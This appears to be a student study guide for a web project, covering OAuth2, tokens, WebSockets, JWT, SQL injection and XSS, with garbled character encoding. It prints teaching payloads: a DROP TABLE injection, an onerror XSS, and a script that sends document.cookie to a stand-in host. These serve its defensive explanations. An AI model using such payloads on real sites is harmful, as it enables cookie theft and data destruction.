API - a set of rules and protocols that allows different software applications to communicate with each other

---
#### OAuth2

OAuth2 is an authorization protocol that lets users log in using external services (e.g. Google, GitHub, school intranet), without sharing their password directly with your site. Instead, it exchanges secure tokens to verify identity between systems.

### üîê Why Use OAuth2?
- Offloads credential management to trusted providers
- Simplifies account creation and login
- Useful if you're connecting to platforms like the 42 API or any centralized user database

### ‚ö†Ô∏è Restrictions in This Project

You **cannot use libraries or tools** that:
- Provide a **complete out-of-the-box OAuth solution** (e.g. `passport`, `Auth0`, `NextAuth`)
- Implement the entire login flow on your behalf

‚úÖ You **can** use:
- Small utilities that handle **subtasks** (e.g. parsing a redirect URL or encoding a token)
- Manual integration: sending your own requests to an OAuth provider, handling redirects, and managing tokens manually

üß† Note: OAuth2 is **not required** for ft_transcendence. You can implement a local alias system or custom login instead.

<details>
<summary><em>Example (Manual OAuth2 Flow)</em></summary>

Let‚Äôs say your team chooses to use the 42 API for user login. Here‚Äôs how you could approach it **without violating constraints**:

1. **Redirect user to 42‚Äôs login URL** with proper client ID and scopes  
   ‚Üí You can hardcode or generate this manually

2. **User logs in**, and 42 redirects back to your site with an authorization code  
   ‚Üí You capture this code in your frontend or backend

3. **Exchange the code for a token** using a POST request from your server  
   ‚Üí Manual `curl` or native PHP logic ‚Äî no external library needed

4. **Store the token** securely (server-side or in a cookie)  
   ‚Üí Use it to authenticate the user across the session

This way, you‚Äôre respecting the rule: **you‚Äôre not importing a full OAuth module**, you‚Äôre stitching the flow together piece by piece.

## Token based authentication

A method where users are identified using a temporary, secure token (usually a string or session ID) issued after login. The server validates this token with each action to confirm the user‚Äôs identity, without needing to store passwords or credentials long-term.

- Can be used with simple alias systems or full login flows
- Does **not require OAuth2**
- Useful for verifying players during tournaments, chat messages, or game submissions

<details>
<summary><strong>Example</strong></summary>

> Think of how you created a session in **webserv**: after a user logged in, you might have stored a session ID in a cookie or header. Each subsequent request checked that ID to confirm the user was valid ‚Äî *that's token-based authentication.*
>
> Similarly, in **ft_irc**, each client had to introduce itself (e.g. with a nickname) before sending commands. While it wasn't technically a "token," the concept is similar: assign an identity, and validate it before letting the user interact.
>
</details>
This approach lets you build custom lightweight security for things like tournament actions, chat messages, and match submissions, even if you're not using full login systems or external identity providers.

## Websockets

WebSockets are a protocol that creates a **persistent, two-way connection** between a user's browser and your server. Unlike traditional HTTP (which sends a request and then closes), WebSockets stay open, making them ideal for live interaction.

### üîß What They‚Äôre Used For
- **Real-time Pong gameplay** (syncing ball and paddle positions)
- **In-game chat** (players see each other's messages instantly)
- **Live match updates** (e.g. "Next match: Alice vs Bob")
- **Player status events** (disconnects, score changes)

### üîÑ How They Keep Data Live
Once a WebSocket connection is opened, both client and server can push data to each other **at any time**, without needing to refresh the page or send separate HTTP requests.

<details>
<summary><strong>Example1</strong></summary> 
   
> Bob moves his paddle ‚Üí browser sends a WebSocket message to server  
> Server immediately forwards that to Alice‚Äôs browser  
> Alice sees Bob‚Äôs paddle move, in real time

This keeps gameplay smooth, without delay or polling.
</details>



### üõ°Ô∏è Security & Sanitation
WebSockets are just a data channel, they don‚Äôt sanitize anything by default.

You **must** manually clean and validate anything users send:
- **On the server**, before storing or rebroadcasting (SQLi risk)
- **On the client**, before displaying in the DOM (XSS risk)

<details>
<summary><strong>Example2</strong></summary>
 
> A user sends a chat message with weird code or unexpected HTML  
> If you display it without filtering, it could break your page ‚Äî or worse, run scripts  
> Always treat WebSocket messages like *untrusted input*

### üß™ Beginner-Friendly Example
WebSockets commonly transmit data using lightweight JSON messages , here is a clean and maliciouse message:

```json
{
  "event": "chat",
  "sender": "Alice",
  "message": "Good luck!"
}

{
  "event": "chat",
  "sender": "Alice",
  "message": "<img src='x' onerror='alert(\"Hacked!\")'>"
}
```

### JWT

JWT stands for *JSON Web Token*. It's a compact, secure string used to verify a user's identity after login or registration.
After a successful login, the server creates a token using a **payload** (containing user data) and **signs** it with a secret key, typically using an algorithm like HMAC SHA256.
The final token is sent to the browser, and used in future requests so the server knows who‚Äôs interacting without needing to log in again each time.

<details>
<summary><strong>Payload example</strong></summary>
   
```json
{
  "alg": "HS256",
  "typ": "JWT"
}

{
  "userId": " 42 "
   "alias": "Alice")"
}
```

the server takes this payload (header and user data) , creates a signiture and applies it to the end of the token

``` <encoded-header>.<encoded-payload>.<signature> ```

</details>



### üßæ Token storage options
##### Cookies
- Login persist across sessions and browser refresh
- Can be HTTPonly (secure flags) to reduce XSS risk
- Auto sent with requests, ideal for backend validation
- Or store in a session store (like Redis) tied to a cookie token
##### Memory
- (e.g. JS variable)	Temporary login, single session, lost on page reload
- Simpler, useful for lightweight or temporary login

Most teams use Node.js, Python, Go, or PHP for JWT-heavy work because of mature libraries and easy support for hashing, signing, and validation.

### SQL Injection

SQL Injection is a type of attack where malicious users send crafted input that tricks your server into executing unintended database commands.
Instead of behaving like simple form input, the attacker embeds **SQL commands** into the request, potentially altering or destroying data.

### ‚ö†Ô∏è Example (Unsafe Query)
<details>
<summary><strong>unsafe query example</strong></summary>

```sql
SELECT * FROM users WHERE name = 'Alice';
```
An attacker might submit:

```sql
'Alice'; DROP TABLE users; --
```

This tunrs your query into
```sql
SELECT * FROM users WHERE name = 'Alice'; DROP TABLE users; --
```

üß® Result: Your entire users table gets deleted, all accounts wiped.
</details>

### üõ°Ô∏è Typical Prevention
- Use parameterized queries or prepared statements

```sql
SELECT * FROM users WHERE name = ?
```
- Never build SQL queries using raw user input
- Sanitize and validate input server-side, especially for:
   - Login forms
   - Search fields
   - Any user-controlled input that interacts with a database
Backend protects by:

### XSS Cross Site Scripting
Cross-Site Scripting (XSS) is an attack where a user submits malicious content that gets rendered as executable code in someone else's browser.

Often used to:
- Steal cookies or session tokens
- Trick users with fake login prompts
- Break or deface UI content

### ‚ö†Ô∏è Example (Injected Script)
<details>
<summary><strong>injected script example</strong></summary>
   
Attacker sends a chat message:
```html
<script>fetch('https://malicious.site/send?cookies=' + document.cookie)</script>
```

if this is displayed raw in frontend: 

```html
<div>User says: <script>...</script></div>
```
üß® Result: The script runs in every viewer‚Äôs browser, sending their cookies to the attacker.

</details>

üõ°Ô∏è Typical Prevention
- Sanitize user content before displaying
- Escape <, >, ", ', /, and other unsafe characters
- Use text-safe render methods (e.g. textContent, not innerHTML)
- Set Content Security Policy (CSP) headers to restrict which scripts can run
- Avoid trusting input across chat, comments, forms, or aliases

üß† TL;DR If someone submits HTML, never render it raw. Treat user input like radioactive material until cleaned.
